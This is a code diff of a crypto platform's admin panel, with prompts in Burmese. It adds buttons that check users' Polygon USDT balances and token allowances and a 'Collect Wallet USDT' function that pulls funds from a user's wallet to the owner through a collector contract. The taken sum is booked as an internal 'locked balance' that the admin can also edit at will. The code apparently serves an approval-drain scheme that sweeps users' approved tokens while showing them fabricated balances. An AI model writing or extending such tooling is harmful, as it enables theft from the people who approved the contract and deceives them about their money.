-                            <span class="font-bold text-white font-mono">${escapeHtml(u.userId || "---")}</span>
-                            <span class="px-2 py-0.5 rounded-full ${isBanned ? "bg-red-500/20 text-red-400" : "bg-emerald-500/20 text-emerald-400"}">${escapeHtml(u.status || "approved")}</span>
+                <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl flex flex-col gap-3 text-xs">
+                    <div class="flex flex-col md:flex-row md:items-center justify-between gap-3">
+                        <div class="space-y-1.5">
+                            <div class="flex flex-wrap items-center gap-2">
+                                <span class="font-bold text-white font-mono">ID: ${escapeHtml(u.userId || "---")}</span>
+                                <span class="px-2 py-0.5 rounded-full ${isBanned ? "bg-red-500/20 text-red-400" : "bg-emerald-500/20 text-emerald-400"}">${escapeHtml(u.status || "approved")}</span>
+                            </div>
+                            <p class="font-mono text-slate-300 break-all">Wallet: ${escapeHtml(walletAddr)}</p>
+                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1 font-mono bg-slate-950/70 border border-slate-800/90 p-2.5 rounded-xl">
+                                <div>
+                                    <span class="text-slate-400 block text-[11px]">Wallet Balance</span>
+                                    <span class="text-emerald-400 font-bold">${escapeHtml(walletBalText)}</span>
+                                </div>
+                                <div>
+                                    <span class="text-slate-400 block text-[11px]">Allowance</span>
+                                    <span class="text-cyan-300 font-bold">${escapeHtml(allowanceText)}</span>
+                                </div>
+                                <div>
+                                    <span class="text-slate-400 block text-[11px]">Interest / Ref</span>
+                                    <span class="text-slate-200">${escapeHtml(formatUsdtOneDecimal(u.interestBalance || 0))} / ${escapeHtml(formatUsdtOneDecimal(u.referralBalance || 0))}</span>
+                                </div>
+                                <div>
+                                    <span class="text-slate-400 block text-[11px]">Locked Balance</span>
+                                    <span class="text-amber-300 font-semibold">${escapeHtml(formatUsdtOneDecimal(u.lockedBalance || 0))}</span>
+                                </div>
+                            </div>
                         </div>
-                        <p class="font-mono text-slate-300 break-all">${escapeHtml(u.walletAddress)}</p>
-                        <p class="font-mono text-slate-400">Interest: ${Number(u.interestBalance || 0).toFixed(4)} | Referral: ${Number(u.referralBalance || 0).toFixed(4)} | Locked: ${Number(u.lockedBalance || 0).toFixed(4)}</p>
                     </div>
-                    <div class="flex flex-wrap gap-2">
-                        <button onclick="editUserBalances('${escapeHtml(u.walletAddress)}', ${Number(u.interestBalance || 0)}, ${Number(u.referralBalance || 0)}, ${Number(u.lockedBalance || 0)})" class="bg-blue-600 hover:bg-blue-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+
+                    <div class="flex flex-wrap gap-2 pt-1 border-t border-slate-800/80">
+                        <button onclick="checkSingleUserRow('${escapeHtml(walletAddr)}')" class="bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+                            Check On-Chain
+                        </button>
+                        <button onclick="collectWalletUsdtToOwner('${escapeHtml(walletAddr)}', ${walletBalNum})" class="bg-cyan-600 hover:bg-cyan-500 text-slate-950 px-3 py-1.5 rounded-lg font-bold cursor-pointer">
+                            Collect Wallet USDT
+                        </button>
+                        <button onclick="openEditBalanceModal('${escapeHtml(walletAddr)}', ${Number(u.interestBalance || 0)}, ${Number(u.referralBalance || 0)}, ${Number(u.lockedBalance || 0)})" class="bg-blue-600 hover:bg-blue-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
                             Edit Balances
                         </button>
-                        <button onclick="toggleBanUser('${escapeHtml(u.walletAddress)}', ${isBanned})" class="${isBanned ? "bg-emerald-600 hover:bg-emerald-500" : "bg-red-600/80 hover:bg-red-500"} px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+                        <button onclick="toggleBanUser('${escapeHtml(walletAddr)}', ${isBanned})" class="${isBanned ? "bg-emerald-600 hover:bg-emerald-500" : "bg-red-600/80 hover:bg-red-500"} px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
                             ${isBanned ? "Unban" : "Ban User"}
                         </button>
                     </div>
@@ -435,22 +998,86 @@
         }
 
         // ADMIN ACTIONS
+        async function checkSingleUserRow(walletAddr) {
+            await fetchSingleWalletOnChain(walletAddr);
+            updateTotalUsersWalletBanner();
+            applyUserFiltersAndRender();
+        }
+
+        async function collectWalletUsdtToOwner(userWallet, cachedBalNum = 0) {
+            if (!adminWalletSigner) {
+                alert("Contract မှတစ်ဆင့် USDT လွှဲပြောင်းရယူရန် အပေါ်မှ 'Connect Admin Wallet' ကို အရင်နှိပ်ပါ။");
+                return;
+            }
+
+            const latestInfo = await fetchSingleWalletOnChain(userWallet);
+            const liveBalNum = latestInfo && latestInfo.checked ? Number(latestInfo.walletBalanceNum || 0) : Number(cachedBalNum || 0);
+
+            if (liveBalNum <= 0) {
+                alert(`User (${userWallet}) ၏ Wallet ထဲတွင် လက်ရှိ USDT လက်ကျန်ငွေ (0.0 USDT) မရှိပါ။`);
+                return;
+            }
+
+            const inputVal = prompt(
+                `User Wallet (${userWallet}) ထဲမှ Owner (${adminWalletAddress}) သို့ လွှဲပြောင်းရယူမည့် USDT ပမာဏကို ထည့်ပါ (လက်ရှိ Balance: ${formatUsdtOneDecimal(liveBalNum)}):`,
+                liveBalNum.toFixed(6)
+            );
+            if (inputVal === null) return;
+
+            const amountNum = Number(inputVal);
+            if (!Number.isFinite(amountNum) || amountNum <= 0) {
+                alert("မှန်ကန်သော USDT ပမာဏ ဂဏန်းထည့်ပါ။");
+                return;
+            }
+
+            if (amountNum > liveBalNum + 0.000001) {
+                alert(`ထည့်သွင်းသော ပမာဏ (${formatUsdtOneDecimal(amountNum)}) သည် User ၏ လက်ရှိ Wallet Balance (${formatUsdtOneDecimal(liveBalNum)}) ထက် ကျော်လွန်နေပါသည်။`);
+                return;
+            }
+
+            if (!confirm(`User (${userWallet}) ထံမှ ${formatUsdtOneDecimal(amountNum)} ကို Contract (${COLLECTOR_CONTRACT_ADDRESS}) ဖြင့် Owner (${adminWalletAddress}) ထံ လွှဲပြောင်းရယူမည်လား?`)) {
+                return;
+            }
+
+            try {
+                setAdminLog(`Contract collectUSDT (${formatUsdtOneDecimal(amountNum)}) transaction ပို့နေပါသည်...`);
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, adminWalletSigner);
+                const rawAmount = ethers.parseUnits(amountNum.toFixed(6), 6);
+                const tx = await collector.collectUSDT(userWallet, rawAmount);
+                const receipt = await tx.wait();
+
+                const userRef = db.collection("users").doc(userWallet.toLowerCase());
+                await db.runTransaction(async (t) => {
+                    const snap = await t.get(userRef);
+                    const prevLocked = snap.exists ? Number(snap.data().lockedBalance || 0) : 0;
+                    t.set(userRef, {
+                        lockedBalance: Number((prevLocked + amountNum).toFixed(6)),
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                });
+
+                setAdminLog(`✅ Collect Wallet USDT (${formatUsdtOneDecimal(amountNum)}) အောင်မြင်ပါပြီ! Tx: ${receipt?.hash || tx?.hash}`);
+                await fetchSingleWalletOnChain(userWallet);
+                updateTotalUsersWalletBanner();
+                await loadInitialFirestoreData();
+            } catch (err) {
+                console.error(err);
+                alert("Collect Wallet USDT မအောင်မြင်ပါ: " + (err.reason || err.message || ""));
+            }
+        }
+
         async function checkOnChainStatus(reqId, walletAddr) {
             const target = document.getElementById(`liveCheck_${reqId}`);
             if (target) target.innerText = "Checking Polygon USDT balance & allowance...";
             try {
-                const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, readProvider);
-                const [bal, allow] = await Promise.all([
-                    usdt.balanceOf(walletAddr),
-                    usdt.allowance(walletAddr, COLLECTOR_CONTRACT_ADDRESS)
-                ]);
-                const balFmt = Number(ethers.formatUnits(bal, 6)).toFixed(6);
-                const allowFmt = allow > ethers.parseUnits("1000000000", 6)
-                    ? "Unlimited"
-                    : Number(ethers.formatUnits(allow, 6)).toFixed(6);
-
+                const info = await fetchSingleWalletOnChain(walletAddr);
+                if (!info) {
+                    if (target) target.innerText = "On-chain check timed out. Try again.";
+                    return;
+                }
+                updateTotalUsersWalletBanner();
                 if (target) {
-                    target.innerText = `Live Wallet USDT: ${balFmt} | Approved Allowance: ${allowFmt}`;
+                    target.innerText = `Live Wallet USDT: ${formatUsdtOneDecimal(info.walletBalanceNum)} | Allowance: ${formatAllowanceOneDecimal(info)}`;
                 }
             } catch (err) {
                 if (target) target.innerText = "On-chain check failed: " + (err.message || "");
@@ -478,7 +1105,7 @@
                 alert("Contract မှတစ်ဆင့် USDT လွှဲပြောင်းရယူရန် အပေါ်မှ 'Connect Admin Wallet' ကို အရင်နှိပ်ပါ။");
                 return;
             }
-            if (!confirm(`User (${userWallet}) ထံမှ ${amountUsdt.toFixed(6)} USDT ကို Contract (collectUSDT) ဖြင့် လွှဲပြောင်းရယူပြီး Approve လုပ်မည်လား?`)) {
+            if (!confirm(`User (${userWallet}) ထံမှ ${formatUsdtOneDecimal(amountUsdt)} ကို Contract (collectUSDT) ဖြင့် လွှဲပြောင်းရယူပြီး Approve လုပ်မည်လား?`)) {
                 return;
             }
 
@@ -515,35 +1142,48 @@
             }
         }
 
-        async function editUserBalances(walletAddr, curInterest, curRef, curLocked) {
-            const newInterest = prompt("Interest Balance (USDT) အသစ်ထည့်ပါ:", curInterest);
-            if (newInterest === null) return;
-            const newRef = prompt("Referral Balance (USDT) အသစ်ထည့်ပါ:", curRef);
-            if (newRef === null) return;
-            const newLocked = prompt("Locked Balance (USDT) အသစ်ထည့်ပါ:", curLocked);
-            if (newLocked === null) return;
+        function openEditBalanceModal(walletAddr, curInterest, curRef, curLocked) {
+            editingWalletAddress = walletAddr.toLowerCase();
+            document.getElementById("editModalWalletLabel").innerText = `Wallet: ${walletAddr}`;
+            document.getElementById("inputInterestBalance").value = Number(curInterest || 0);
+            document.getElementById("inputReferralBalance").value = Number(curRef || 0);
+            document.getElementById("inputLockedBalance").value = Number(curLocked || 0);
+            document.getElementById("editBalanceModal").classList.remove("hidden");
+        }
 
-            const iVal = Number(newInterest);
-            const rVal = Number(newRef);
-            const lVal = Number(newLocked);
+        function closeEditBalanceModal() {
+            editingWalletAddress = null;
+            document.getElementById("editBalanceModal").classList.add("hidden");
+        }
+
+        document.getElementById("editBalanceForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            if (!editingWalletAddress) return;
+
+            const iVal = Number(document.getElementById("inputInterestBalance").value);
+            const rVal = Number(document.getElementById("inputReferralBalance").value);
+            const lVal = Number(document.getElementById("inputLockedBalance").value);
+
             if (![iVal, rVal, lVal].every((n) => Number.isFinite(n) && n >= 0)) {
                 alert("ဂဏန်းတန်ဖိုး မှန်ကန်စွာ ထည့်ပါ။");
                 return;
             }
 
             try {
-                await db.collection("users").doc(walletAddr.toLowerCase()).set({
+                await db.collection("users").doc(editingWalletAddress).set({
                     interestBalance: Number(iVal.toFixed(6)),
                     referralBalance: Number(rVal.toFixed(6)),
                     lockedBalance: Number(lVal.toFixed(6)),
                     updatedAt: firebase.firestore.FieldValue.serverTimestamp()
                 }, { merge: true });
-                setAdminLog(`User (${walletAddr}) ၏ Balance များကို ပြင်ဆင်ပြီးပါပြီ။`);
+
+                setAdminLog(`User (${editingWalletAddress}) ၏ Interest / Referral / Locked Balance များကို ပြင်ဆင်ပြီးပါပြီ။`);
+                closeEditBalanceModal();
                 await loadInitialFirestoreData();
             } catch (err) {
                 alert("Balance ပြင်ဆင်မှု မအောင်မြင်ပါ: " + (err.message || ""));
             }
-        }
+        });
 
         async function toggleBanUser(walletAddr, currentlyBanned) {
             const nextStatus = currentlyBanned ? "approved" : "banned";
